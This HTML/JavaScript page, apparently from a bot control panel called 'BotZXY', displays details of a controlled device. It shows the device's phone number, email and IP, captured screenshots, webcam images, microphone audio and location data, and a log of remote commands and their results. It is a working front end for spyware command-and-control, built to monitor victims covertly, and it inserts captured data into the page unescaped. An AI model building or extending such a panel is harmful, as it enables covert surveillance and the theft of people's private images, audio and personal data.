<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BotZXY - Device Details</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
    <style>
        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', monospace; }
        .navbar { background: #1a1a1a; border-bottom: 1px solid #333; padding: 10px 20px; }
        .navbar-brand { color: #00ff88; font-weight: bold; }
        .navbar-brand span { color: #0d6efd; }
        .card { background: #1a1a1a; border: 1px solid #333; border-radius: 12px; }
        .card-header { background: #1a1a1a; border-bottom: 1px solid #333; color: #00ff88; }
        .badge-online { background: #00ff88; color: #000; }
        .badge-offline { background: #ff4444; color: #fff; }
        .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #222; }
        .info-row .label { color: #888; }
        .info-row .value { color: #fff; font-weight: 500; }
        .preview-img { max-width: 100%; max-height: 400px; border-radius: 8px; cursor: pointer; }
        .preview-img:hover { opacity: 0.9; }
        .command-log { font-size: 0.8rem; color: #888; }
        .command-log .success { color: #00ff88; }
        .command-log .failed { color: #ff4444; }
        .command-log .pending { color: #ffaa00; }
        code { color: #00ff88; background: #2a2a2a; padding: 2px 8px; border-radius: 4px; }
        .back-btn { color: #00ff88; text-decoration: none; }
        .back-btn:hover { color: #00cc66; text-decoration: underline; }
    </style>
</head>
<head>
    <!-- ... -->
    <style>
        body { background: var(--bg-primary, #0b0b1a); color: var(--text-primary, #e2e8f0); }
        .sidebar, .card, .settings-card, .stat-card, .device-card, .capture-item, .stat-box, .chart-card, .table-card {
            background: var(--bg-card, rgba(18,18,40,0.45));
            border-color: var(--border-color, rgba(255,255,255,0.04));
        }
    </style>
    <script>
        // Carica tema e lingua DAL LOCALSTORAGE PRIMA del rendering
        (function() {
            const savedTheme = localStorage.getItem('botzxy_theme') || 'dark';
            const themes = {
                'dark': { bg: '#0b0b1a', text: '#e2e8f0', card: 'rgba(18,18,40,0.45)', border: 'rgba(255,255,255,0.04)' },
                'light': { bg: '#f1f5f9', text: '#0a0a1a', card: 'rgba(255,255,255,0.85)', border: 'rgba(0,0,0,0.08)' },
                'blue': { bg: '#0a1a3a', text: '#e2e8f0', card: 'rgba(10,26,58,0.7)', border: 'rgba(59,130,246,0.15)' },
                'green': { bg: '#0a1a0a', text: '#e2e8f0', card: 'rgba(10,26,10,0.7)', border: 'rgba(52,211,153,0.15)' },
                'purple': { bg: '#1a0a2a', text: '#e2e8f0', card: 'rgba(26,10,42,0.7)', border: 'rgba(139,92,246,0.15)' },
                'orange': { bg: '#2a1a0a', text: '#e2e8f0', card: 'rgba(42,26,10,0.7)', border: 'rgba(245,158,11,0.15)' },
                'cyber': { bg: '#0a0a0a', text: '#00ff88', card: 'rgba(0,0,0,0.7)', border: 'rgba(0,255,136,0.15)' },
                'matrix': { bg: '#0a0a0a', text: '#00ff00', card: 'rgba(0,0,0,0.7)', border: 'rgba(0,255,0,0.15)' }
            };
            const t = themes[savedTheme] || themes['dark'];
            document.documentElement.style.setProperty('--bg-primary', t.bg);
            document.documentElement.style.setProperty('--text-primary', t.text);
            document.documentElement.style.setProperty('--bg-card', t.card);
            document.documentElement.style.setProperty('--border-color', t.border);
            document.body.style.background = t.bg;
            document.body.style.color = t.text;
            document.body.className = 'theme-' + savedTheme;
            
            // Lingua
            const savedLang = localStorage.getItem('botzxy_language') || 'it';
            document.documentElement.lang = savedLang;
        })();
    </script>
</head>
<script src="/static/js/config.js"></script>
<body>
    <nav class="navbar">
        <div class="container-fluid">
            <div>
                <a href="/dashboard" class="back-btn me-3"><i class="fas fa-arrow-left"></i></a>
                <span class="navbar-brand"><i class="fas fa-robot me-2"></i>Bot<span>ZXY</span></span>
                <span class="text-muted ms-2">| Device Details</span>
            </div>
            <div>
                <span id="deviceStatus" class="badge">Loading...</span>
                <button class="btn btn-sm btn-outline-primary ms-2" onclick="refreshDevice()">
                    <i class="fas fa-sync"></i>
                </button>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <div id="deviceInfo" class="row">
            <div class="col-md-4">
                <div class="card">
                    <div class="card-header"><i class="fas fa-info-circle me-2"></i>Device Information</div>
                    <div class="card-body">
                        <div id="infoContent">
                            <div class="info-row"><span class="label">Device ID</span><span class="value" id="d_id">-</span></div>
                            <div class="info-row"><span class="label">Platform</span><span class="value" id="d_platform">-</span></div>
                            <div class="info-row"><span class="label">Hostname</span><span class="value" id="d_hostname">-</span></div>
                            <div class="info-row"><span class="label">IP Address</span><span class="value" id="d_ip">-</span></div>
                            <div class="info-row"><span class="label">OS Version</span><span class="value" id="d_os">-</span></div>
                            <div class="info-row"><span class="label">Phone Number</span><span class="value" id="d_phone">-</span></div>
                            <div class="info-row"><span class="label">Email</span><span class="value" id="d_email">-</span></div>
                            <div class="info-row"><span class="label">Registered</span><span class="value" id="d_registered">-</span></div>
                            <div class="info-row"><span class="label">Last Seen</span><span class="value" id="d_lastseen">-</span></div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header"><i class="fas fa-terminal me-2"></i>Recent Captures</div>
                    <div class="card-body">
                        <div id="capturesContent">
                            <p class="text-muted">No captures yet</p>
                        </div>
                    </div>
                </div>
                
                <div class="card mt-3">
                    <div class="card-header"><i class="fas fa-list me-2"></i>Command History</div>
                    <div class="card-body" style="max-height: 300px; overflow-y: auto;">
                        <div id="commandsContent">
                            <p class="text-muted">No commands yet</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Preview Modal -->
    <div class="modal fade" id="previewModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content bg-dark text-white" style="border: 1px solid #333;">
                <div class="modal-header" style="border-bottom: 1px solid #333;">
                    <h5 class="modal-title"><i class="fas fa-eye me-2" style="color:#00ff88;"></i>Preview</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body text-center">
                    <img id="previewImage" src="" alt="Preview" style="max-width:100%; max-height:80vh; border-radius: 8px;">
                    <audio id="previewAudio" controls style="width:100%; margin-top:10px; display:none;"></audio>
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let deviceId = window.location.pathname.split('/').pop();
        let previewModal = new bootstrap.Modal(document.getElementById('previewModal'));

        function refreshDevice() {
            $.get(`/api/device/${deviceId}`, function(data) {
                renderDevice(data.device);
                renderCaptures(data.captures);
                renderCommands(data.commands);
            }).fail(function() {
                $('#deviceInfo').html('<div class="alert alert-danger">Device not found</div>');
            });
        }

        function renderDevice(device) {
            $('#d_id').text(device.device_id);
            $('#d_platform').text(device.platform || 'Unknown');
            $('#d_hostname').text(device.hostname || 'Unknown');
            $('#d_ip').text(device.ip || 'N/A');
            $('#d_os').text(device.os_version || 'Unknown');
            $('#d_phone').text(device.phone_number || 'N/A');
            $('#d_email').text(device.email || 'N/A');
            $('#d_registered').text(device.registered_at ? new Date(device.registered_at).toLocaleString() : 'N/A');
            $('#d_lastseen').text(device.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never');
            
            let status = device.is_online ? 'Online' : 'Offline';
            let statusClass = device.is_online ? 'badge-online' : 'badge-offline';
            $('#deviceStatus').text(status).removeClass('badge-online badge-offline').addClass(statusClass);
        }

        function renderCaptures(captures) {
            if (!captures || captures.length === 0) {
                $('#capturesContent').html('<p class="text-muted">No captures yet</p>');
                return;
            }
            
            let html = '<div class="row">';
            captures.forEach(function(cap) {
                let typeIcon = cap.type === 'screenshot' ? 'fa-desktop' : 
                               cap.type === 'webcam' ? 'fa-camera' : 
                               cap.type === 'mic' ? 'fa-microphone' : 
                               cap.type === 'location' ? 'fa-map-pin' : 'fa-file';
                let date = new Date(cap.created_at).toLocaleString();
                let imgSrc = cap.data ? `data:image/png;base64,${cap.data}` : '';
                if (cap.type === 'screenshot' || cap.type === 'webcam') {
                    html += `
                        <div class="col-md-4 mb-3">
                            <div class="card">
                                <img src="${imgSrc}" class="preview-img" onclick="showImage('${imgSrc}')" alt="Capture">
                                <div class="card-footer" style="font-size:0.7rem; color:#888; border-top:1px solid #333;">
                                    <i class="fas ${typeIcon} me-1"></i> ${cap.type} - ${date}
                                </div>
                            </div>
                        </div>
                    `;
                } else if (cap.type === 'mic') {
                    let audioSrc = `data:audio/wav;base64,${cap.data}`;
                    html += `
                        <div class="col-md-4 mb-3">
                            <div class="card">
                                <div class="card-body text-center">
                                    <i class="fas fa-microphone" style="font-size:2rem; color:#00ff88;"></i>
                                    <audio controls style="width:100%; margin-top:10px;">
                                        <source src="${audioSrc}" type="audio/wav">
                                    </audio>
                                </div>
                                <div class="card-footer" style="font-size:0.7rem; color:#888; border-top:1px solid #333;">
                                    <i class="fas ${typeIcon} me-1"></i> ${cap.type} - ${date}
                                </div>
                            </div>
                        </div>
                    `;
                } else {
                    html += `
                        <div class="col-md-4 mb-3">
                            <div class="card">
                                <div class="card-body">
                                    <i class="fas ${typeIcon} me-2"></i>
                                    <span style="font-size:0.8rem;">${cap.type}</span>
                                    <div style="font-size:0.7rem; color:#888; margin-top:5px;">${date}</div>
                                    <pre style="font-size:0.7rem; color:#aaa; max-height:100px; overflow-y:auto; background:#2a2a2a; padding:10px; border-radius:6px; margin-top:10px;">${cap.data ? cap.data.substring(0, 200) : 'No data'}</pre>
                                </div>
                            </div>
                        </div>
                    `;
                }
            });
            html += '</div>';
            $('#capturesContent').html(html);
        }

        function renderCommands(commands) {
            if (!commands || commands.length === 0) {
                $('#commandsContent').html('<p class="text-muted">No commands yet</p>');
                return;
            }
            
            let html = '';
            commands.forEach(function(cmd) {
                let statusClass = cmd.status === 'executed' ? 'success' : 
                                  cmd.status === 'failed' ? 'failed' : 'pending';
                let date = new Date(cmd.created_at).toLocaleString();
                let result = cmd.result || '';
                html += `
                    <div class="command-log" style="padding: 8px 0; border-bottom: 1px solid #222;">
                        <div>
                            <span class="${statusClass}">●</span>
                            <strong style="color:#00ff88;">${cmd.command}</strong>
                            <span class="text-muted ms-2">${cmd.params || ''}</span>
                            <span class="badge ${statusClass === 'success' ? 'bg-success' : statusClass === 'failed' ? 'bg-danger' : 'bg-warning'} ms-2" style="font-size:0.6rem;">${cmd.status}</span>
                            <span class="text-muted float-end" style="font-size:0.7rem;">${date}</span>
                        </div>
                        ${result ? `<div style="font-size:0.7rem; color:#888; margin-top:4px; background:#2a2a2a; padding:4px 8px; border-radius:4px; word-break:break-all;">${result.substring(0, 150)}${result.length > 150 ? '...' : ''}</div>` : ''}
                    </div>
                `;
            });
            $('#commandsContent').html(html);
        }

        function showImage(src) {
            $('#previewImage').attr('src', src);
            $('#previewAudio').hide();
            previewModal.show();
        }

        refreshDevice();
        setInterval(refreshDevice, 15000);
    </script>
</body>
</html>
